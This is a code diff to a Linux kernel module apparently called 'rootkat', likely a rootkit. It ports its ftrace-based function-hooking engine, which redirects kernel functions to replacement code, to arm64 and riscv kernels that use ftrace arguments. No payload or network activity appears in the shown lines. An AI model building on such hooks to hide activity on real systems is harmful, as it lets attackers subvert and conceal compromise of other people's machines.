@@ -11,7 +11,6 @@ static void notrace rootkat_ftrace_thunk(unsigned long ip, unsigned long parent_
                                          struct ftrace_ops *ops, struct ftrace_regs *fregs)
 {
 	struct rootkat_hook *h = container_of(ops, struct rootkat_hook, ops);
-	struct pt_regs *regs = ftrace_get_regs(fregs);
 
 	/* Avoid re-entry from our own replacement. This is also the
 	 * mechanism that makes `orig(...)` safe — when our replacement
@@ -21,7 +20,22 @@ static void notrace rootkat_ftrace_thunk(unsigned long ip, unsigned long parent_
 	if (within_module(parent_ip, THIS_MODULE))
 		return;
 
-	PT_REGS_IP(regs) = (unsigned long)h->replacement;
+	/*
+	 * CONFIG_DYNAMIC_FTRACE_WITH_ARGS (arm64 6.4+, riscv):
+	 *   ftrace_get_regs() returns NULL — modify PC via fregs directly.
+	 *   FTRACE_OPS_FL_SAVE_REGS is invalid without CONFIG_DYNAMIC_FTRACE_WITH_REGS.
+	 * Legacy WITH_REGS (x86_64, older arm64 builds):
+	 *   Full pt_regs saved; modify IP via PT_REGS_IP(ftrace_get_regs(fregs)).
+	 */
+#ifdef CONFIG_DYNAMIC_FTRACE_WITH_ARGS
+	ftrace_regs_set_instruction_pointer(fregs, (unsigned long)h->replacement);
+#else
+	{
+		struct pt_regs *regs = ftrace_get_regs(fregs);
+
+		PT_REGS_IP(regs) = (unsigned long)h->replacement;
+	}
+#endif
 }
 
 int rootkat_hook_install_at(struct rootkat_hook *h, unsigned long addr)
@@ -36,9 +50,18 @@ int rootkat_hook_install_at(struct rootkat_hook *h, unsigned long addr)
 	h->original = (void *)h->target;
 
 	h->ops.func = rootkat_ftrace_thunk;
+	/*
+	 * WITH_ARGS kernels: SAVE_REGS is invalid (no WITH_REGS); IPMODIFY alone suffices.
+	 * WITH_REGS kernels (x86_64, older arm64): SAVE_REGS required alongside IPMODIFY.
+	 */
+#ifdef CONFIG_DYNAMIC_FTRACE_WITH_ARGS
+	h->ops.flags = FTRACE_OPS_FL_RECURSION
+	             | FTRACE_OPS_FL_IPMODIFY;
+#else
 	h->ops.flags = FTRACE_OPS_FL_SAVE_REGS
 	             | FTRACE_OPS_FL_RECURSION
 	             | FTRACE_OPS_FL_IPMODIFY;
+#endif
 
 	rc = ftrace_set_filter_ip(&h->ops, h->target, 0, 0);
 	if (rc) {
